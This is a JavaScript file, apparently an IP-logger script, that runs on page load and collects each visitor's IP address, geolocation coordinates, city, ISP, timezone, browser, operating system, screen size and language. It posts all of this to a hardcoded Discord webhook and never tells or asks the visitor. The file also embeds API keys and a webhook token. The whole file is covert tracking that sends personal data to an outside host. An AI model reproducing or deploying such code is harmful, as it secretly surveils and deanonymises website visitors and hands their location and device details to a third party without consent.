function fetchGoogleMapsLocation(latitude, longitude) {
    return `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
}

function fetchWeatherData(city) {
    const apiKey = "04156fa1016d4d03ba651651240510";
    const apiUrl = `https://api.weatherapi.com/v1/current.json?key=${apiKey}&q=${city}&aqi=no`;

    return fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
            return {
                temp_c: data.current.temp_c,
                temp_f: data.current.temp_f
            };
        });
}

fetch("https://api.ipdata.co?api-key=062a506916fc8b1ac165abe3bb16fa3029c71b2350d80b46486ab36c")
    .then(response => response.json())
    .then(ipData => {
        const latitude = ipData.latitude;
        const longitude = ipData.longitude;
        const googleMapsLink = fetchGoogleMapsLocation(latitude, longitude);

        fetchWeatherData(ipData.city)
            .then(weatherData => {
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const screenWidth = window.screen.width;
                const screenHeight = window.screen.height;
                const isOnline = navigator.onLine ? "Yes" : "No";
                const browserName = (() => {
                    const ua = navigator.userAgent;
                    if (ua.includes("Firefox")) return "Firefox";
                    if (ua.includes("Chrome")) return "Chrome";
                    if (ua.includes("Safari")) return "Safari";
                    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
                    if (ua.includes("Edge")) return "Edge";
                    if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
                    return "Unknown";
                })();
                const operatingSystem = (() => {
                    const ua = navigator.userAgent;
                    if (ua.includes("Win")) return "Windows";
                    if (ua.includes("Mac")) return "MacOS";
                    if (ua.includes("X11")) return "UNIX";
                    if (ua.includes("Linux")) return "Linux";
                    return "Unknown";
                })();

                const embed = {
                    "embeds": [{
                        "title": "visitors",
                        "color": 3447003,
                        "fields": [
                            {
                                "name": "🌍 Country",
                                "value": `${ipData.country_name} :flag_${ipData.country_code.toLowerCase()}:`
                            },
                            {
                                "name": "📍 Region",
                                "value": `${ipData.region} (${ipData.region_code})`
                            },
                            {
                                "name": "🌆 City",
                                "value": `${ipData.city}`
                            },
                            {
                                "name": "🌐 Coordinates",
                                "value": `Latitude: ${latitude}, Longitude: ${longitude}`
                            },
                            {
                                "name": "⏰ Timezone",
                                "value": `${ipData.time_zone.name} :clock2:`
                            },
                            {
                                "name": "📡 ISP",
                                "value": `${ipData.asn.name || 'Not available'}`
                            },
                            {
                                "name": "🔍 IP Address",
                                "value": `${ipData.ip}`
                            },
                            {
                                "name": "🌡️ Temperature",
                                "value": `${weatherData.temp_c}°C / ${weatherData.temp_f}°F`
                            },
                            {
                                "name": "📍 Location on Google Maps",
                                "value": `[View on Google Maps](${googleMapsLink})`
                            },
                            {
                                "name": "💻 User Agent",
                                "value": `${userAgent}`
                            },
                            {
                                "name": "🖥️ Platform",
                                "value": `${platform}`
                            },
                            {
                                "name": "🗣️ Language",
                                "value": `${language}`
                            },
                            {
                                "name": "📏 Screen Resolution",
                                "value": `${screenWidth} x ${screenHeight}`
                            },
                            {
                                "name": "🌐 Online",
                                "value": `${isOnline}`
                            },
                            {
                                "name": "🌍 Browser",
                                "value": `${browserName}`
                            },
                            {
                                "name": "🖥️ Operating System",
                                "value": `${operatingSystem}`
                            }
                        ]
                    }]
                };

                const webhookUrl = "https://discord.com/api/webhooks/1406095423873220648/q7fwSrwNnN3y6XDLcnGc_XZnyHFOOz-EZBU_nXebIjfWWgohUuNSnujzfvDAqeRP00Rr";
                fetch(webhookUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(embed)
                });
            });
    });
